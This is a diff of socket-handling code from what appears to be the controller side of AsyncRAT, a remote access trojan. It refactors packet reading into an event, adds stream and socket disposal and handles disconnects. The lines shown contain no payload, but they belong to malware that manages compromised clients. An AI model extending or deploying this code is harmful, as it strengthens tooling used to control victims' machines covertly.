@@ -17,7 +17,8 @@ namespace AsyncRAT_Sharp.Sockets
         public bool BufferRecevied;
         public MemoryStream MS;
         public ListViewItem LV;
-        public bool isClientConnected;
+        public event ReadEventHandler Read;
+        public delegate void ReadEventHandler(Clients client, byte[] data);
 
         public void InitializeClient(Socket CLIENT)
         {
@@ -29,10 +30,10 @@ namespace AsyncRAT_Sharp.Sockets
             Buffer = new byte[1];
             Buffersize = 0;
             BufferRecevied = false;
-            isClientConnected = true;
             MS = new MemoryStream();
             LV = null;
-           client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
+            Read += HandlePacket.Read;
+            client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
 
         }
 
@@ -51,6 +52,7 @@ namespace AsyncRAT_Sharp.Sockets
                         if (Buffer[0] == 0)
                         {
                             Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
+                            MS.Dispose();
                             MS = new MemoryStream();
                             if (Buffersize > 0)
                             {
@@ -60,7 +62,6 @@ namespace AsyncRAT_Sharp.Sockets
                         }
                         else
                         {
-
                             await MS.WriteAsync(Buffer, 0, Buffer.Length);
                         }
                     }
@@ -69,13 +70,19 @@ namespace AsyncRAT_Sharp.Sockets
                         await MS.WriteAsync(Buffer, 0, Recevied);
                         if (MS.Length == Buffersize)
                         {
-                            HandlePacket.Read(this, MS.ToArray());
-                            MS = new MemoryStream();
+
+                            Read?.BeginInvoke(this, MS.ToArray(), null, null);
                             Buffer = new byte[1];
                             Buffersize = 0;
                             BufferRecevied = false;
+                            MS.Dispose();
+                            MS = new MemoryStream();
                         }
                     }
+                }
+                else
+                {
+                    Disconnected();
                 }
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
             }
@@ -83,8 +90,7 @@ namespace AsyncRAT_Sharp.Sockets
             {
                 Disconnected();
             }
-
-            }
+        }
 
         delegate void _isDisconnected();
         public void Disconnected()
@@ -95,14 +101,21 @@ namespace AsyncRAT_Sharp.Sockets
             {
                 LV.Remove();
             }
+            try
+            {
+                MS.Dispose();
+                client.Close();
+                client.Dispose();
+            }
+            catch { }
         }
+
         public async void BeginSend(byte[] Msgs)
         {
-            if (isClientConnected || client.Connected)
+            if (client.Connected)
             {
                 try
                 {
-
                     using (MemoryStream MS = new MemoryStream())
                     {
                         byte[] buffer = Msgs;
